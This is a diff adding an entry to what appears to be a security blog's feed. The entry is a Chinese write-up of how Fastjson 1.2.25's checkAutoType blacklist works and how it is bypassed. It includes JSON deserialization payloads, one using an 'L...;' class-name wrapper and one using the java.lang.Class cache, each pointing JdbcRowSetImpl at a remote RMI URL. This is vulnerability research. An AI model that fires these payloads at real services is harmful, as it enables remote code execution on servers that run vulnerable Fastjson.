@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>Fastjson的持续对抗</title>
+    <link href="/2023/05/15/Fastjson%E7%9A%84%E6%8C%81%E7%BB%AD%E5%AF%B9%E6%8A%97/"/>
+    <url>/2023/05/15/Fastjson%E7%9A%84%E6%8C%81%E7%BB%AD%E5%AF%B9%E6%8A%97/</url>
+    
+    <content type="html"><![CDATA[<p>这篇文章会记录Fastjson持续的防御和绕过的过程，非常有意思；慢慢更新…</p><h2 id="Fastjson-1-2-25"><a href="#Fastjson-1-2-25" class="headerlink" title="Fastjson-1.2.25"></a>Fastjson-1.2.25</h2><p>在1.2.25中，官方对之前的反序列化漏洞进行了修复，引入了checkAutoType安全机制，默认情况下autoTypeSupport关闭，不能直接反序列化任意类，而打开AutoType之后，会基于内置黑名单来实现安全检测，fastjson也提供了添加黑名单的接口。</p><p>安全更新主要击中在<code>fastjson.parser.ParserConfig</code>，首先关注到这几个成员变量</p><p><img src="https://img.katck.com/images/2023/05/15/841503c722780193008c7e5d20422cb3.png" alt="image-20230515145209063"></p><ul><li>autoTypeSupport：标识是否开启任意类型的反序列化，默认为关闭</li><li>denyList：反序列化类的黑名单</li><li>acceptList：反序列化白名单</li></ul><p><strong>添加反序列化白名单的三种方法：</strong></p><ol><li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(&quot;org.example.fastjson.&quot;)</code></li><li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=org.example.fastjson.</code></li><li>在fastjson.properties中添加：<code>fastjson.parser.autoTypeAccept=org.example.fastjson.</code></li></ol><p><strong>checkAutoType逻辑：</strong></p><p>观察一下<code>checkAutoType()</code>的逻辑，如果开启了autoType，先判断类名是否在白名单中，如果在，就用<code>TypeUtils.loadClass</code>加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常</p><p><img src="https://img.katck.com/images/2023/05/15/38b79ddd0c18a7b26fe05ff5f8951449.png" alt="image-20230515145751067"></p><p>如果没有开启autoType，则是先使用黑名单匹配，再使用白名单匹配和加载。</p><p>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或 exceptClass 不为空，也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code>加载</p><p><img src="https://img.katck.com/images/2023/05/15/a259bf30b0c3c48800748fdd125ba462.png" alt="image-20230515153710043"></p><p><strong>loadClass逻辑：</strong></p><p>跟进一下到 <code>loadClass</code>，这里才是实际加载类的地方。这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的<code>[</code>、<code>L</code>、<code>;</code>字符</p><p><img src="https://img.katck.com/images/2023/05/15/15a4dae7109f12f127d4197c9daef14a.png" alt="image-20230515155402772"></p><p>利用这个特征即可绕过黑名单的限制了。</p><p>攻击者可以使用带有描述符的类来绕过黑名单的限制，在类加载的时候描述符会被去掉，让恶意类成功加载。</p><p>最终的 payload 其实就是在之前的 payload 类名上前后加上<code>L</code>和<code>;</code>即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://172.18.4.4/Command&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="不开启AutoType绕过"><a href="#不开启AutoType绕过" class="headerlink" title="不开启AutoType绕过"></a>不开启AutoType绕过</h4><p>越多的利用条件代表攻击面越小，有没有可能存在不开启AutoType的攻击方式呢？</p><p>通过Mappings缓存可以进行绕过</p><p>Payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>         <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Evil&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="第一次checkAutoType："><a href="#第一次checkAutoType：" class="headerlink" title="第一次checkAutoType："></a>第一次checkAutoType：</h5><p>还是先看checkAutoType，由于我们存在两个@type，按照顺序，先来第一个java.lang.Class</p><p>首先去<code>TypeUtils.getClassFromMapping()</code>缓存中找，但是没有找到。然后会通过<code>deserializers.findClass</code>查找</p><p><img src="https://img.katck.com/images/2023/05/15/1835d4dc83bd60454472233a8f539b95.png" alt="image-20230515165347374"></p><p><code>deserializers</code>存在<code>Class.class</code>，直接返回类</p><p><img src="https://img.katck.com/images/2023/05/15/a4b0f8be9d993cf26f78a77467c6ded6.png" alt="image-20230515165944260"></p><p>调用至<code>deserializer.deserialze()</code></p><p><img src="https://img.katck.com/images/2023/05/15/c721ac6d41c668eca543e3c418879801.png" alt="image-20230515170119805"></p><p>跟进至<code>MiscCodec#deserialze()</code></p><p>这里通过<code>clazz == Class.class</code>，调用<code>TypeUtils.loadClass</code>加载类</p><p><img src="https://img.katck.com/images/2023/05/15/abd017ca6a852088dd767501692ef0aa.png" alt="image-20230515170516634"></p><p>跟进发现这里会调用<code>mappings.put(className, clazz)</code>将ClassName加入缓存</p><p><img src="https://img.katck.com/images/2023/05/15/e3216d7e8de141fe8629036cbf73c61f.png" alt="image-20230515170638559"></p><h5 id="第二次checkAutoType："><a href="#第二次checkAutoType：" class="headerlink" title="第二次checkAutoType："></a>第二次checkAutoType：</h5><p>第二次checkAutoType，在<code>TypeUtils</code>缓存中直接查找到了我们想反序列化的类<code>com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="https://img.katck.com/images/2023/05/15/0bd639aa2f2b56164c0c2a7bd726a7c3.png" alt="image-20230515171959233"></p><p>后续的触发利用链跟之前一样，这个方法太巧妙了。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Java Security</category>
+      
+      <category>Fastjson</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Java Security</tag>
+      
+      <tag>Fastjson</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Fastjson 1.2.24</title>
     <link href="/2023/05/12/Fastjson-1-2-24/"/>
     <url>/2023/05/12/Fastjson-1-2-24/</url>
